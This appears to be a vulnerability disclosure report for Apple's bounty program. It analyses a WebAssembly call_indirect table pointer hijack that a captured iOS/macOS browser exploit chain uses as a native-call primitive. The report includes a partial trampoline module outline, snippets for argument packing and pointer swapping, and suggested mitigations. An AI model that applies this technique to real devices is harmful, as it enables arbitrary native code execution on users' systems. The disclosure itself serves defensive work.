# Apple Security Bounty Report: WebAssembly `call_indirect` Function Table Pointer Hijack

**Date:** March 2026
**Severity:** High
**Component:** JavaScriptCore WebAssembly — `call_indirect` dispatch via function reference table
**Affected Platforms:** iOS 16.0–17.x, macOS (arm64e devices: A12+ / M1+)
**Category:** Software and Data Integrity Failure — Wasm Dispatch Hijack

---

## 1. Executive Summary

A technique observed in an in-the-wild exploit framework hijacks WebAssembly's `call_indirect` dispatch mechanism to redirect execution to arbitrary native addresses. The exploit overwrites the internal JIT code pointer stored in a Wasm `Table` object's compiled representation, causing subsequent `call_indirect` calls to jump to attacker-controlled addresses instead of the legitimate Wasm function. This converts WebAssembly's structured control flow into an arbitrary native function call primitive with full ARM64 register control.

---

## 2. Vulnerability Description

### 2.1 The Security Assumption Being Violated

WebAssembly's `call_indirect` instruction is designed to provide **type-safe indirect calls** within the Wasm sandbox. The security model assumes:
- `call_indirect` can only dispatch to functions present in the Wasm table
- The table's internal representation (JIT-compiled code pointers) is not accessible from JavaScript
- Wasm's structured control flow prevents arbitrary native jumps

### 2.2 The Flaw

The observed exploit demonstrates that:

1. **The Wasm Table's internal JIT code pointer is at a known, stable offset** (`bvVGhS`) from the compiled function's address. This offset is part of the 71-field configuration table the exploit carries for each target platform.

2. **The pointer is writable** — once the exploit has arbitrary read/write (via the NaN-boxing/dual-Wasm-instance primitive), it can overwrite this pointer.

3. **No integrity check protects the table pointer** — `call_indirect` reads the pointer and jumps to it without verifying that it points to a legitimate Wasm function.

4. **The exploit can pass arbitrary register values** — by exporting a function that accepts 16 `i32` parameters (representing 8 `i64` register pairs x0–x7), the exploit controls the full ARM64 calling convention.

### 2.3 The Attack

The exploit constructs a minimal 306-byte Wasm module (the "Call Trampoline") with this structure:

```wasm
(module
  (type $call_type (func (param i64 i64 i64 i64 i64 i64 i64 i64) (result i64)))
  (table (export "t") 1 funcref)        ;; Function table — the hijack target
  (memory (export "m") 1)               ;; Linear memory for return values
  (func (export "o") (result i32) ...)  ;; Accessor for JIT code pointer address
  (func (export "f") (param i32 i32 i32 i32 i32 i32 i32 i32
                            i32 i32 i32 i32 i32 i32 i32 i32)
    ;; Pack 16 i32 params into 8 i64 values
    ;; Call through table[0] via call_indirect
    ;; Store 64-bit return value in linear memory
  )
  (func $call_inner ...)                ;; Internal: packs params and dispatches
  (elem (i32.const 0) $call_inner)      ;; Initialize table[0]
)
```

The hijack sequence:

```
1. Instantiate the Call Trampoline Wasm module
2. Read the JIT code pointer at offset bvVGhS from the compiled 'o' export
3. Save the original pointer value
4. Overwrite the pointer with the target native address
5. Call exports.f(x0_lo, x0_hi, x1_lo, x1_hi, ..., x7_lo, x7_hi)
6. call_indirect executes → CPU jumps to target address with controlled registers
7. Read return value from linear memory (mem[0] = low 32, mem[1] = high 32)
8. Restore original pointer in finally block
```

---

## 3. Technical Details

### 3.1 Wasm Module Exports

| Export | Type | Purpose |
|---|---|---|
| `t` | Table (1 funcref) | Contains the function whose JIT pointer gets hijacked |
| `m` | Memory (1 page = 64KB) | Stores return values at offset 0 |
| `o` | Function → i32 | Accessor to locate the table's internal JIT pointer |
| `f` | Function (16 × i32) → void | Entry point — packs args, calls through table |

### 3.2 Argument Packing

The 16 `i32` parameters are packed into 8 `i64` values inside `$call_inner`:

```wasm
;; Pack x0 from params 0,1
local.get $p0    ;; low 32 bits
i64.extend_i32_u
local.get $p1    ;; high 32 bits
i64.extend_i32_u
i64.const 32
i64.shl
i64.or           ;; x0 = (p1 << 32) | p0
```

This maps directly to the ARM64 calling convention: `x0` through `x7` are the first 8 general-purpose argument registers.

### 3.3 Return Value Capture

After `call_indirect` returns, the 64-bit return value is split and stored in linear memory:

```wasm
local.tee $ret
i32.wrap_i64              ;; Low 32 bits
i32.store offset=0        ;; → mem[0]
local.get $ret
i64.const 32
i64.shr_u
i32.wrap_i64              ;; High 32 bits
i32.store offset=4        ;; → mem[4]
```

JavaScript reads the result via `new Uint32Array(instance.exports.m.buffer)`.

### 3.4 Cleanup Guarantee

The pointer swap is always wrapped in a `try/finally` block:

```javascript
const original = P.ee(table_ptr_addr);  // Read original JIT pointer
try {
    P.br(table_ptr_addr, target);        // Swap to target address
    M.call(...args);                      // Execute via call_indirect
} finally {
    P.br(table_ptr_addr, original);      // Restore original
}
```

This ensures the Wasm module remains functional even if the target function throws or crashes, and leaves no persistent corruption.

---

## 4. Impact Assessment

**Severity: High**

This technique provides:

1. **Arbitrary native function calls** with full register control (x0–x7) from JavaScript
2. **Return value capture** — the caller receives the 64-bit return value
3. **Reusability** — the same trampoline is used for all native calls throughout the exploit chain (PAC bypass operations, `mach_vm_allocate`, `dlsym`, `mprotect`, etc.)
4. **Cleanup safety** — the `finally` block guarantees the Wasm instance is restored

This is the universal "native call" primitive that enables all subsequent exploitation stages. Without it, the exploit cannot invoke kernel traps, resolve symbols, or execute shellcode.

---

## 5. Suggested Mitigations

1. **Add integrity protection to Wasm Table JIT pointers** — PAC-sign the internal code pointer stored in the Table's compiled representation. Verify the signature before `call_indirect` dispatch.

2. **Randomize the JIT pointer offset** — the exploit relies on a known, stable offset (`bvVGhS`) from the compiled function address to the table's JIT pointer. Randomizing this layout per-instance would break the offset table approach.

3. **Validate `call_indirect` targets** — before jumping, verify that the target address falls within the Wasm module's own JIT region. This would prevent redirects to arbitrary native addresses.

4. **Separate Wasm Table metadata from writable memory** — store the Table's JIT code pointers in a read-only page that is only writable by the JIT compiler itself, not by arbitrary write primitives.

---

## 6. Evidence Source

Identified through static reverse engineering of an in-the-wild, multi-stage iOS/macOS browser exploit chain. The Call Trampoline is a 306-byte Wasm module embedded as a byte array within the exploit's loader modules and used for all native function invocations throughout the exploit chain. Full source artifacts and detailed analysis are available upon request.

---

*Prepared for Apple Security Bounty Program.*
